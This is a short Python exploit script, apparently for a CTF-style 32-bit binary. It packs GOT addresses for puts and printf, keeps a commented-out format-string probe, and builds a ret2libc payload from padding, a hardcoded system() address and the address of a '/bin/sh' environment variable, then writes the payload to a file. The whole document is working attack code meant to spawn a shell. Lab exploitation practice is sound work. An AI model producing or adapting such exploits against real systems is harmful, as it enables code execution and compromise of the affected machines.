"""
GOT : 0804c010 -> \x10\xc0\x04\x08
<loop> : 0x xx xx xx xx Changes frequently
"""

import struct

GOT_puts = struct.pack("I", 0x804c01c)
GOT_printf = struct.pack("I", 0x804c010)

loop_func = struct.pack("I", 0x80491b2) 
target_func = struct.pack("I", 0x80491e2)

#payload = "%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p"
#payload += "\n"
payload = "AAAABBBBCCCCDDDDEEEE"+GOT_printf
payload += "\n"
payload += loop_func
payload += "\n"

system = struct.pack("I", 0xf7e04040) #static 
return_after_system = "CCCC"
bin_sh = struct.pack("I", 0xffffdfc0) # THIS IS AN ENVIRONMENT VARIABLE : export MYSHELL="/bin/sh"

padding = "A"*(256)+"B"*(12)

payload += padding + system + return_after_system + bin_sh

print(payload)

file = open("payload", "w")
file.write(payload)
file.close()

